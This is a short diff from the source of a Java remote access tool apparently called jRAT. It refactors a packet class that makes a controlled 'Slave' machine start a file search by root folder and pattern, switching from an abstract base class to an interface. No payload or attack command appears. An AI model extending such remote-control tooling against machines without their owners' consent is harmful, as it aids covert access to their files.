@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 
-public class Packet53StartSearch extends AbstractOutgoingPacket {
+public class Packet53StartSearch implements OutgoingPacket {
 
 	private String searchRoot;
 	private String pattern;
